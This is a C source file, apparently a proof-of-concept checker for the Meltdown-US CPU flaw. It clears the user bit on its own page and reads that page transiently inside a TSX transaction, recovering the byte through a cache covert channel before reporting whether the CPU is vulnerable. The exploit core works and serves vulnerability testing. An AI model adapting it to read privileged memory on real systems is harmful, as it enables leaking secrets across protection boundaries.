#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "libpte/ptedit_header.h"
#include "libcache/cache.h"
#include "lib/global.h"

char *victim_page;

#define SECRET 'S'

void main(int argc, char **argv)
{
    if (argc != 3)
    {
        printf("Usage\t: ./poc_* [pagesize] [threshold]\nExample\t: ./poc_x86 4096 200\n");
        return;
    }

    // 准备阶段
    PREPARE();

    printf("Meltdown_US Begins...\n");

    // Initialize PTEditor to manipulate page table entries
    if (ptedit_init())
    {
        printf(ANSI_COLOR_GREEN "Meltdown_US: Not Vulnerable\n" ANSI_COLOR_RESET);
        printf("Meltdown_US done!\n\n");
        return;
    }

    // We need a shared mapping. One mapping gets US bit cleared for unauthorized access.
    // The second one remains valid to keep data in the cache as it works better.
    int shm = shm_open("shared_mapping", O_CREAT | O_RDWR, 0644);
    if (shm == -1)
    {
        printf(ANSI_COLOR_GREEN "Meltdown_US: Not Vulnerable\n" ANSI_COLOR_RESET);
        printf("Meltdown_US done!\n\n");
        return;
    }

    // Set memory objects size
    if (ftruncate(shm, 4096 * 2) == -1)
    {
        printf(ANSI_COLOR_GREEN "Meltdown_US: Not Vulnerable\n" ANSI_COLOR_RESET);
        printf("Meltdown_US done!\n\n");
        return;
    }

    // Victim mapping that gets US bit cleared
    victim_page = (char *)mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                               MAP_SHARED, shm, 0);

    // Mapping for keeping data in the cache
    char *accessor = (char *)mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                                  MAP_SHARED, shm, 0);

    // Write data we want to recover to our victim page
    memset(victim_page, SECRET, pagesize * sizeof(char));
    // Clear US bit of our victim page
    ptedit_pte_clear_bit(victim_page, 0, PTEDIT_PAGE_BIT_USER);

    // Flush our shared memory
    flush_shared_memory();
    int passed_count = 0;
    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        // Load data into the cache and fence
        maccess(accessor);
        mfence();
        // Start TSX transaction if available on CPU
        if (try_start())
        {
            // Null pointer access prolongs transient window
            maccess(0);
            // Perform access based on unauthorized data
            maccess(mem + *victim_page * pagesize);
            try_abort();
        }
        try_end();

        // Recover data from cache covert channel
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
    }
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        // printf("Success rate: %lf\n", (double)passed_count / MAX_TRY_TIMES);
        printf(ANSI_COLOR_RED "Meltdown_US: Vulnerable\n" ANSI_COLOR_RESET);
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_US: Not Vulnerable\n" ANSI_COLOR_RESET);
    }
    munmap(victim_page, pagesize);
    munmap(accessor, pagesize);
    shm_unlink("shared_mapping");
    ptedit_cleanup();
    printf("Meltdown_US done!\n\n");
}